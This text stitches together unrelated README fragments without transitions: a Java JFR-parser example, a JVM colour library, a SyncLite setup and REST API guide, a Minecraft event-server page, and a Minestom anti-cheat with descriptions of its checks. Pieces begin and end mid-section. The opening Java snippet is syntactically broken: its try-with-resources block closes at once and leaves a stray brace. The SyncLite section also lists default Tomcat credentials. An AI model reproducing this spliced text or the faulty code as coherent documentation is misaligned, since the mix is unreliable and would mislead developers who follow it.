The interface can have methods excluded from linking with the JFR types - by annotating such methods with `@JfrIgnore`.

```java

@JfrType(""custom.MyEvent"")
public interface MyEvent extends JfrEvent {
  String myfield();
}

try (JafarParser parser = JafarParser.open(""path_to_jfr.jfr"")) {}
    // registering a handler will return a cookie which can be used to deregister the same handler
    var cookie = parser.handle(MyEvent.class, event -> {
        System.out.println(event.startTime());
        System.out.println(event.eventThread().javaName());
        System.out.println(event.myfield());
    });
    parser.handle(MyEvent.class, event -> {
        // do something else
    });
    parser.run();
    
    cookie.destroy(parser);
    // this time only the second handler will be called
    parser.run();
}

```

This short program will parse the recording and call the `handle` method for each `custom.MyEvent` event.
The number of handlers per type is not limited, they all will be executed sequentially.
With the handlers known beforehand, the parser can safely skip all unreachable events and types, massively saving on the parsing time.

bowbahdoe/color,main,"# color

Color library for the JVM.

Heavily based on [go-colorful](https://github.com/lucasb-eyer/go-colorful/tree/master)
by [Lucas Beyer](https://github.com/lucasb-eyer).

```xml
<dependency>
    <groupId>dev.mccue</groupId>
    <artifactId>color</artifactId>
    <version>2024.10.09.3</version>
</dependency>
```

## Status

I am still working through this and working toward actually understanding
colors, color spaces, etc.

As such I might revisit some design choices without mercy. Notably I need to zero in
on where and when is best to auto-clamp values in the different color implementations.

Keep that in mind if you want to use it for anything. You can always reach out
to me directly to make sure some particular piece of API surface is stable.

Other than that, I need to do a lot more documentation. Both javadocs and
tutorials for appropriate usage.

## Usage

You can create a color using one of the static factory methods on `Color`.

```java
var red = Color.sRGB(1, 0, 0);
var blue = Color.hex(""#0000FF"");
```

And you can get the components of a color in a particular color space using matching instance methods.

```java
// RGB in 0..1
var srgb = Color.hex(""#00FF0F"").sRGB();
// RBG in 0..255
var rgb = Color.hex(""#00FF0F"").RGB255();
// HSL
var hsl = Color.hex(""#00FF0F"").HSL();
```

To blend between different colors you can use the various blend methods.
These are tailored to blending in a particular color space.

```java
var red = Color.sRGB(1, 0, 0);
var blue = Color.hex(""#0000FF"");
var purple = red.blendLuv(blue);
```

There are also utilities for generating palettes of colors
and for sorting colors by their ""distance"" to each-other.

```java
var happy = Color.happy(10);
var sorted = Color.sort(happy);
```

### Quick Start - Native/Docker based

NOTE: Below instructions enable a quick start and trial of SyncLite platform. 
For production usage, it is recommended to go through installation process to install OpenJDK11 and Tomcat9 (as a service) 
on your Windows/Ubuntu host.

1. Enter bin directory.

2. (One time) Run ```deploy.bat```(WINDOWS) / ```deploy.sh``` (UBUNTU) to deploy the SyncLite consolidator and a SyncLite sample application.
   
   OR Run ```docker-deploy.sh``` (UBUNTU) to deploy a docker container for SyncLite platform.

   OR Manually deploy below war files on your tomcat server:
   - ```SyncLite\target\synclite-platform-dev\lib\consolidator\synclite-consolidator-oss.war```,
   - ```SyncLite\target\synclite-platform-dev\sample-apps\jsp-servlet\web\target\synclite-sample-app-oss.war```
   - ```SyncLite\target\synclite-platform-dev\tools\synclite-dbreader\synclite-dbreader-oss.war```
   - ```SyncLite\target\synclite-platform-dev\tools\synclite-dbreader\synclite-qreader-oss.war```
   - ```SyncLite\target\synclite-platform-dev\tools\synclite-dbreader\synclite-jobmonitor-oss.war```
     
   
3. Run ```start.bat```(WINDOWS) / ```start.sh```(UBUNTU) to start tomcat and the deployed SyncLite applications. (Please note the username/password for tomcat manager web console is synclite/synclite)

   OR Run ```docker-start.sh``` to run the docker container (Please check options passed to docker run command e.g. the home directory of the current user is mapped to ```/root``` inside docker to persist all the
   SyncLite storage in the native host).

   OR manually start applications from your tomcat manager console.

4. Open tomcat manager console http://localhost:8080/manager (Use synclite/synclite as the default user/password when prompted as set by the deploy script). The manager web console will show all the SyncLite applications deployed. 

5. Open http://localhost:8080/synclite-consolidator to launch SyncLite Consolidator application

6. Open http://localhost:8080/synclite-sample-app to launch SyncLite sample web application 

7. Configure and start SyncLite consolidator job in the SyncLite Consolidator application. You can follow through the ""Configure Job"" wizard reviewing all the default configuration values. Create databases/devices of any type from the deployed sample web application and execute SQL workloads on several devices at once specifying the device index range. Observe data consolidator in the SyncLite Cosolidator dashboard. You can check device specific data consolidation progress on individual device pages (from ""List Devices"" page), query destination database on the ""Analyze Data"" page. 

8. This release also comes with a CLI client for SyncLite under tools/synclite-client. You can run synclite-client.bat(WINDOWS)/synclite-client.sh (UBUNTU) to start the client tool and execute SQL operations which are not only executed/persisted on the native database but also consolidated by the SyncLite consolidator into destination DB.
   - Usage 1 : ```synclite-client.bat/synclite-client.sh ==> Will start with DB = <USER.HOME>/synclite/job1/db/test.db, DEVICE_TYPE = SQLITE, CONFIG = <USER.HOME>/synclite/db/synclite_logger.conf```
   - Usage 2 : ```synclite-client.bat/synclite-client.sh <path/to/db/file> --device-type <SQLITE|DUCKDB|DERBY|H2|HYPERSQL|STREAMING|SQLITE_APPENDER|DUCKDB_APPENDER|DERBY_APPENDER|H2_APPENDER|HYPERSQL_APPENDER> --synclite-logger-config <path/to/synclite/logger/config> --server <SyncLite DB Address>```
   - Note: If --sever switch is specified then the client connects to SyncLite DB to  execute SQL statements, else it usages embedded ```SyncLite Logger``` library to directly operate on the devices.
     
9. This release also comes with SyncLite DB server under tools/synclite-db. You can run synclite-db.bat(WINDOWS)/synclite-db.sh(UBUNTU) to start SyncLite DB server and connect to it using synclite-client to execute SQL operations which are not only executed/persisted on the specified embedded database but also consolidated by the SyncLite Consolidator onto the destination databases.
   - Usage 1 : ```synclite-db.bat/synclite-db.sh``` ==> Will start SyncLite DB with default configurations
   - Usage 2 : ```synclite-db.bat/synclite-db.sh --config <path/to/synclite-db/config>```
          
10. Use ```stop.bat``` (Windows) / ```stop.sh```(LINUX) to stop SyncLite consolidator job (if running) and tomcat.
   OR RUN docker-stop.sh to stop the docker container.

11. Refer ```sample_apps/java``` and ```samples_apps/python``` and use any of them as a starting point to build your own application.

12. You can install/use a database of your choice and  perform data consolidation to it (instead of the default SQLite destination): PostgreSQL, MySQL, MongoDB, SQLite, DuckDB.

13. This release also packages docker scripts to setup PostgreSQL and MySQL to serve as SyncLite destinations.
    - ```bin/dst/postgresql``` contains ```docker-deploy.sh```, ```docker-start.sh``` and ```docker-stop.sh```
    - ```bin/dst/mysql``` contains ```docker-deploy.sh```, ```docker-start.sh``` and ```docker.stop.sh```

14. You can deploy your applications on remote hosts/devices and share the local-stage-directory of your respective SyncLite applications with SyncLite Consolidator host via one of the following file staging storages: 
    - SFTP
    - Amazon S3
    - MinIO Object Storage Server
    - Apache Kafka
    - Microsoft OneDrive
    - Google Drive
    - NFS Sharing
    - Local Network Sharing
      
Please check documentation for setting up these staging storages for SyncLite : https://www.synclite.io/resources/documentation
 
15. This release also packages docker scripts to setup SFTP and MinIO servers to serve as SyncLite stage.
    - ```bin/stage/sftp```  contains ```docker-deploy.sh```, ```docker-start.sh``` and ```docker-stop.sh```
    - ```bin/stage/minio``` contains ```docker-deploy.sh```, ```docker-start.sh``` and ```docker-stop.sh```
      NOTE: These scripts contain default configurations. You must change usernames, passwords and setup any additional security mechanisms on top of these basic setups. 

16. The SyncLite docker scripts ```bin/docker-deploy.sh```, ```bin/docker-start.sh```, ```bin/docker-stop.sh``` contain two variables at the top to choose a stage and destination:
    - STAGE : Set it to SFTP or MINIO.
    - DST : Set it to POSTGRESQL or MYSQL.

      Once you set the STAGE and DST to appropriate values e.g. SFTP and POSTGRESQL, the ```docker-deploy.sh``` and ```docker-start.sh``` scripts will bring up docker containers for SyncLite consolidator, SFTP
      server and PostgreSQL server and you will be all set to configure and start a SyncLite consoldiator job be able to consolidate data into PostgreSQL server received from remote SyncLite applications
      configured to connect to the SFTP stage. 

17. After a successful trial, if you need to perform another trial, stop the docker containers, and delete contents under ```/home/synclite``` to start a fresh trial of a different scenario etc.

18. Open http://localhost:8080/synclite-dbreader (and open http://localhost:8080/synclite-consolidator) to setup database ETL/Replication/Migration pipelines.

19. Open http://localhost:8080/synclite-qreader (and open http://localhost:8080/synclite-consolidator) to setup rapid IoT pipelines.

20. Open http://localhost:8080/synclite-job-monitor to manage, monitor and schedule various SyncLite jobs.
    
Refer documentation at https://www.synclite.io/resources/documentation for more details.

NOTE : For production usage, it is recommended to install OpenJDK11 and Tomcat as a service (or any other application server of your choice) and deploy SyncLite consolidator web archive release, Please refer our documentation at www.synclite.io for detailed installation steps for Windows and Ubuntu.


# Using SyncLite Logger

Add ```synclite-logger-<version>.jar``` file created as part of the above build as a dependency in your application.

## Configuration File

Refer ```src/main/resources/synclite_logger.conf``` file for all available configuration options for SyncLite Logger. Refer ""SyncLite Logger Configuration"" section in the documentation at https://www.synclite.io/resources/documentation for more details about all configuration options. 

## Application Code Samples (SQL API)

Refer below code samples to build applications using SyncLite Logger. 

### Transactional Devices : 

Transactional devices (SQLite, DuckDB, Apache Derby, H2, HyperSQL) support all database operations and perform transactional logging of all the DDL and DML operations performed by the application. These enable  developers to build use cases such as building data-intensive sync-ready applications for edge, edge + cloud GenAI search and RAG applications, native SQL (hot) hot data stores, SQL application caches, edge enablement of cloud databases and more.

### Appender Devices :

Appender devices (SQLiteAppender, DuckDBAppender, DerbyAppender, H2Appender, HyperSQLAppender) support all DDL operations and Prepared Statement based INSERT operations, are highly optimized for high speed concurrent batched data ingestion, performing logging of ingested data. Unlike transactional devices, appender devices only allow INSERT DML operations (UPDATE and DELETE are not allowed). Appender devices enable developers to build high volume streaming applications enabled with last mile data integration from thousands of edge points into centralized database destinations as well as in-app analytics by enabling fast read access to ingested data from the underlying local embedded databases storing the ingested/streamed data.

### Streaming Device : 
Streaming device allows all DDL operations (as supported by SQLite) and Prepared Statement based INSERT operations (UPDATE and DELETE are not allowed) to allow high speed concurrent batched data ingestion, performing logging and streaming of the ingested data. Streaming device enable developers to build high volume data streaming applications enabled with last mile data integration from thousands of edge applications into one or more centralized databases/data warehouses/data lakes.

# Launching and using SyncLite DB

```SyncLite DB``` is a sync-enabled, single-node database server that wraps popular embedded databases like SQLite, DuckDB, Apache Derby, H2, and HyperSQL. Unlike the embeddable ```SyncLite Logger``` library for Java and Python applications, ```SyncLite DB``` acts as a standalone server, allowing your edge or desktop applications—regardless of the programming language—to connect and send/post SQL requests (wrapped in JSON format) via a REST API. This makes it an ideal solution for seamless, real-time data synchronization in diverse environments.

1. Go to the directory ```synclite-platform-<version>\tools\synclite-db```
2. Check the configurations in synclite-db.conf and adjust them as per your needs.
3. Run ```synclite-db.bat --config synclite-db.conf``` ( OR ```synclite-db.sh --config synclite-db.conf``` on linux). This starts the SyncLite DB server listening at the specified address.
4. An application in your favoirite programming language can establish a connection with the SyncLite DB server at the specified address and send requests in JSON format as below

	- Connect and initialize a device

   	Request
	```
 	{
 		""db-type"" : ""SQLITE""
 		""db-path"" : ""C:\synclite\users\bob\synclite\job1\test.db""
 		""synclite-logger-config"" : ""C:\synclite\users\bob\synclite\job1\synclite_logger.conf""
 		""sql"" : ""initialize""
 	}
  	```

 	Response from Server 
 	```
  	{
  		""result""  : true	
 		""message"" : ""Database initialized successfully""
 	}
  	```
  
	- Send a sql command to create a table

   	Request
	```
 	{
 		""db-path"" : ""C:\synclite\users\bob\synclite\job1\test.db""
 		""sql"" : ""CREATE TABLE IF NOT EXISTS(a INT, b INT)""
 	}
 	```

 	Response from Server 
 	```
  	{
  		""result"" : ""true""
 		""message"" : ""Update executed successfully, rows affected: 0""
   	}
  	```
  
	- Send a request to perform a batched insert in the created table

   	Request
	```
 	{
 		""db-path"" : ""C:\synclite\users\bob\synclite\job1\test.db""
 		""sql"" : ""INSERT INTO t1(a,b) VALUES(?, ?)""
 		""arguments"" : [[1, ""one""], [2, ""two""]]
   	}
 	```

 	Response from Server 
 	```
  	{
  		""result"" : ""true""
 		""message"" : ""Batch executed successfully, rows affected: 2""
   	}
  	```

	- Send a request to begin a transaction on database

 	Request
	 ```
 	{
 		""db-path"" : ""C:\synclite\users\bob\synclite\job1\test.db""
 		""sql"" : ""begin""
   	}
 	```

 	Response from Server 
 	```
  	{
  		""result"" : ""true""
 		""message"" : ""Transaction started successfully""
  		""txn-handle"": ""f47ac10b-58cc-4372-a567-0e02b2c3d479""
   	}
  	```
	
	- Send a request to execute a sql inside started transaction

   	Request
	```
 	{
 		""db-path"" : ""C:\synclite\users\bob\synclite\job1\test.db""
 		""sql"" : ""INSERT INTO t1(a,b) VALUES(?, ?)""
		""txn-handle"": ""f47ac10b-58cc-4372-a567-0e02b2c3d479""
 		""arguments"" : [[3, ""three""], [4, ""four""]]
   	}
 	```

 	Response from Server 
 	```
  	{
  		""result"" : ""true""
 		""message"" : ""Batch executed successfully, rows affected: 2""
   	}
  	```

	- Send a request to commit a transaction

	Request	
	```
 	{
 		""db-path"" : ""C:\synclite\users\bob\synclite\job1\test.db""
  		""txn-handle"": ""f47ac10b-58cc-4372-a567-0e02b2c3d479""
 		""sql"" : ""commit""
 	}
 	```

 	Response from Server 
 	```
  	{
  		""result"" : ""true""
 		""message"" : ""Transaction committed successfully""
   	}
  	```

	- Send a request to close database   	
 	Request

	 ```
 	{
 		""db-path"" : ""C:\synclite\users\bob\synclite\job1\test.db""
 		""sql"" : ""close""
   	}
 	```
	
 	Response from Server 
 	```
  	{
  		""result"" : ""true""
		""message"" : ""Database closed successfully""
   	}
  	```
 
5. SyncLite DB (internally leveraging SyncLite Logger), creates a device stage directory at configured stage path with sql logs created for each device. These device stage directories are continuously synchronized with SyncLite consolidator for consolidating them into final destination databases.
   
6. Several such hosts, each running SyncLite DB, each of them creating several SyncLite databases/devices (i.e. embedded databases), can synchornize these embedded databases in real-time with a centralized SyncLite consolidator that aggregates the incoming data and changes, in real-time, into configured destination databases.

     
# Running Integration Tests

```SyncLite Validator``` is a GUI based tool with a war file deployed on app server, it can be launched at http://localhost:8080/synclite-validator. A test job can be configured and run to execute all the end to end integration tests which validate data consolidation functionality for various SyncLite device types.

[![Kaela's Tour](https://img.youtube.com/vi/n3BAPr9qGGQ/0.jpg)](https://www.youtube.com/watch?v=n3BAPr9qGGQ)

## 🔨 Technical details
- Server must use the [PaperMC](https://papermc.io) and [Nitori](https://github.com/Gensokyo-Reimagined/Nitori) software.
- It's recommended to use a proxy software like [Velocity](https://papermc.io/software/velocity) or [BungeeCord](https://www.spigotmc.org/wiki/bungeecord/).
- It's highly recommended to enable the server [resource pack](https://cdn.marow.dev/content/KaelaEventPack.zip), otherwise stuff might be a little weird.

## 🔨 Resource Pack
- Resource pack can be downloaded [here](https://cdn.marow.dev/content/KaelaEventPack.zip)
- Resources are on Minecraft version **1.21.1**.

## 🔨 Warning
- This server setup was made for [COVER Corporation](https://cover-corp.com/en/company) & [hololive production](https://hololive.hololivepro.com/en).
- The server is not made to be easy to install outside of the event host.
- This page is going to change by the time!

## 🔨 Acknowledgments
- [COVER Corporation](https://cover-corp.com/en/company) for once more, hosting awesome events!
- [Kaela Kovalskia](https://www.youtube.com/@KaelaKovalskia) for the opportunity!

        // Enable the anti cheat
        // Config.   (passive, disabled checks, debug checks)
        MangoAC.Config config = new MangoAC.Config(false, List.of(), List.of());
        MangoAC ac = new MangoAC(config);
        ac.start();  // Start the anti cheat

        server.start(""0.0.0.0"", 25565);
    }
}
```
You can also use the `Test` class as a reference for how to use the library.

## Check Descriptions

### Flight
Detects flight by checking if player moves more than a certain amount of blocks without 
going up or down.

### BasicSpeed
Detects speed by checking if the player is moving too quickly, using distance over time.

### Teleport
Detects teleportation by checking if the player moves more than a certain amount of blocks
in one packet.

### TeleportSpam
Detects TP-Aura by checking if the player moves more than a certain amount of blocks at a 
time without a certain time frame a certain number of times.

### UnaidedLevitation
Detects flight by checking if the player moves too many blocks up vertically without
touching the ground or being otherwise aided by things such as a ladder, vines, or a liquid.

### IntOverflowCrash
Stops a crash exploit in Minestom by checking if the player moves past the integer limit
on any axis. If this happens they will be stopped and flagged with 100% certainty.

### CpsCheck
Detects auto clickers and killaura by checking if the player's CPS is above a certain
value.

### HitConsistency
Detects auto clickers and killaura by checking how consistently timed the player's hits are.

### Reach
Detects reach by checking how far away players that the player hits are.
